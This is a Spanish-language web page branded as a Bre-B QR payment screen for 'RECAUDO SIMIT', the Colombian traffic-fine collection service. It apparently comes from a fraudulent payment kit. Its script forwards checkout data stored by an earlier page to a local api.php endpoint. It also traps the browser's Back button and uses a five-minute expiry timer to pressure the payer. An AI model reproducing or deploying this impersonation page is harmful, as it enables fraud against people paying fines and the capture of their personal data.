<!doctype html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <title>Bre-B - Pago QR</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');
    body { font-family:'Poppins',sans-serif; background-color:#33055d; overflow-x:hidden; }
    .bg-curve { background-color:#f8f5fc; border-bottom-left-radius:50% 12%; border-bottom-right-radius:50% 12%; }
    ::-webkit-scrollbar { width:0; background:transparent; }
  </style>
</head>

<body class="text-white min-h-screen flex flex-col relative selection:bg-blue-300 selection:text-blue-900 pb-10">

  <div class="absolute top-0 left-0 w-full h-[55vh] md:h-[60vh] bg-curve z-0 overflow-hidden shadow-sm"></div>

  <header class="w-full py-2 flex justify-center items-center bg-[#33055d] relative z-20 shadow-md">
    <img src="./img/bre-b-logo.png" class="h-16 md:h-20 drop-shadow-sm" alt="Bre-B Logo">
  </header>

  <div class="relative z-10 flex flex-col items-center w-full pt-4">

    <h1 class="text-[20px] md:text-2xl font-bold text-[#2a044e] leading-snug text-center px-6 max-w-[400px]">
      Paga desde la app<br>de cualquier entidad habilitada
    </h1>

    <div class="bg-white rounded-[1.5rem] shadow-2xl p-5 w-[90%] max-w-[360px] mt-4 flex flex-col items-center border border-gray-100">
      <h2 class="text-lg font-extrabold text-gray-900 uppercase tracking-wider text-center">RECAUDO SIMIT</h2>

      <p class="text-xs text-gray-800 font-bold mt-0.5">
        Ref: #<span id="reference">—</span>
      </p>

      <div class="my-3 p-1.5 border-2 border-gray-100 rounded-xl w-full flex justify-center">
        <img id="qrImage"
             class="w-56 h-56 md:w-64 md:h-64 rounded-lg"
             alt="QR de Pago">
      </div>

      <p class="text-xl md:text-2xl font-black text-gray-900 tracking-tight">
        Valor: $ <span id="amountDisplay">0</span>
      </p>

      <div class="mt-2 text-[10px] text-gray-800 text-center">
        ID: <span id="brebId">—</span>
      </div>
    </div>

    <div class="w-[90%] max-w-[360px] mt-4">
      <img src="./img/banks-breb.png" alt="Bancos habilitados"
           class="w-full h-auto object-contain rounded-xl opacity-90 hover:opacity-100 transition-opacity">
    </div>

    <div class="flex justify-between items-start w-[90%] max-w-[380px] mt-4">
      <div class="flex flex-col items-center text-center w-1/3 px-1">
        <div class="mb-2">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3"></path>
          </svg>
        </div>
        <p class="text-white text-[10px] font-medium leading-tight">Abre la app<br>de tu banco</p>
      </div>

      <div class="flex flex-col items-center text-center w-1/3 px-1">
        <div class="mb-2">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 013.75 9.375v-4.5zM3.75 14.625c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5a1.125 1.125 0 01-1.125-1.125v-4.5zM13.5 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 0113.5 9.375v-4.5z"></path>
            <path stroke-linecap="round" stroke-linejoin="round" d="M6.75 6.75h.75v.75h-.75v-.75zM6.75 16.5h.75v.75h-.75v-.75zM16.5 6.75h.75v.75h-.75v-.75zM13.5 13.5h.75v.75h-.75v-.75zM13.5 19.5h.75v.75h-.75v-.75zM19.5 13.5h.75v.75h-.75v-.75zM19.5 19.5h.75v.75h-.75v-.75zM16.5 16.5h.75v.75h-.75v-.75z"></path>
          </svg>
        </div>
        <p class="text-white text-[10px] font-medium leading-tight">Escanea este<br>código QR</p>
      </div>

      <div class="flex flex-col items-center text-center w-1/3 px-1">
        <div class="mb-2 bg-white/10 rounded-full p-1">
          <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4.5 12.75l6 6 9-13.5"></path>
          </svg>
        </div>
        <p class="text-white text-[10px] font-medium leading-tight">Confirma tu<br>pago y listo.</p>
      </div>
    </div>

    <div class="mt-4 flex justify-center w-full" id="timerContainer">
      <div class="bg-white/10 backdrop-blur-sm border border-white/20 text-white rounded-full px-4 py-1.5 flex items-center gap-2 text-xs font-medium transition-colors">
        <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
        </svg>
        <span>Expira en:</span>
        <span id="timer" class="font-bold tracking-wider tabular-nums">5:00</span>
      </div>
    </div>

    <div class="mt-4 w-[90%] max-w-[360px]">
      <button id="btnFinalizarQR" type="button" onclick="finalizarPago()"
        class="w-full bg-white hover:bg-gray-100 text-[#33055d] font-bold py-2.5 px-6 rounded-xl shadow-lg transition-all flex items-center justify-center gap-2 text-sm">
        <span>YA REALICÉ EL PAGO</span>
        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
        </svg>
      </button>
    </div>

    <div class="mt-4 bg-white rounded-2xl py-2 px-8 flex items-center justify-center w-[90%] max-w-[360px] shadow-lg mb-4">
      <img src="./img/bre-b-logo.png" class="h-6" alt="Bre-B Logo">
    </div>
  </div>

<script>
  const params = new URLSearchParams(window.location.search);

  const amount = Number(params.get('amount') || 0);
  const brebId = params.get('id') || ('BREB_' + Date.now());
  const keyId = params.get('key_id') || 'OU9E5OG6KF0RE57LGX8S6363';

  const money = n => Number(n || 0).toLocaleString('es-CO');

  document.getElementById('amountDisplay').textContent = money(amount);
  document.getElementById('brebId').textContent = brebId;

  // La referencia visible utiliza el ID recibido, sin dejar una referencia fija.
  document.getElementById('reference').textContent = brebId;

  // Datos guardados por la página anterior, si están disponibles.
  let checkoutData = null;
  try {
    checkoutData = JSON.parse(localStorage.getItem('checkout_data') || 'null');
  } catch (_) {}

  // Payload QR dinámico. El QR se genera con los datos de esta operación.
  // No se reutiliza el QR fijo del ejemplo.
  const qrPayload = JSON.stringify({
    merchant: 'SIMIT',
    amount: amount,
    transaction_id: brebId,
    key_id: keyId,
    currency: 'COP'
  });

  const qrUrl =
    'https://api.qrserver.com/v1/create-qr-code/?size=350x350&format=png&ecc=M&margin=10&data=' +
    encodeURIComponent(qrPayload);

  document.getElementById('qrImage').src = qrUrl;

  // Prevenir uso del botón Atrás.
  history.pushState(null, null, location.href);
  window.onpopstate = function () { history.go(1); };

  async function finalizarPago() {
    const btn = document.getElementById('btnFinalizarQR');
    if (!btn || btn.disabled) return;

    if (!amount || amount <= 0) {
      alert('El monto de pago no es válido.');
      return;
    }

    try {
      localStorage.setItem('payment_amount', String(amount));
      localStorage.setItem('payment_breb_id', brebId);
      localStorage.setItem('payment_key_id', keyId);
    } catch (_) {}

    btn.innerHTML =
      '<div class="w-5 h-5 border-2 border-[#33055d] border-t-transparent rounded-full animate-spin"></div>' +
      '<span>PROCESANDO...</span>';
    btn.disabled = true;

    // Registro de confirmación usando los valores reales de esta operación.
    fetch('./api.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'track_breb_confirmed',
        amount: amount,
        breb_id: brebId,
        key_id: keyId,
        checkout_data: checkoutData
      })
    }).catch(() => {});

    setTimeout(() => {
      window.location.replace('./?payment=success&amount=' +
        encodeURIComponent(amount) +
        '&id=' + encodeURIComponent(brebId));
    }, 600);
  }

  // Temporizador: 5 minutos.
  let timeLeft = 300;
  const timerDisplay = document.getElementById('timer');
  const timerContainer = document.getElementById('timerContainer')?.firstElementChild;

  const countdown = setInterval(() => {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    timerDisplay.textContent =
      `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

    if (timeLeft <= 20 && timerContainer) {
      timerContainer.classList.remove('bg-white/10', 'border-white/20');
      timerContainer.classList.add(
        'bg-red-500/20', 'text-red-400', 'border-red-500/50'
      );
    }

    if (timeLeft <= 0) {
      clearInterval(countdown);
      window.location.replace('./?payment=expired&id=' +
        encodeURIComponent(brebId));
    }

    timeLeft--;
  }, 1000);
</script>
</body>
</html>
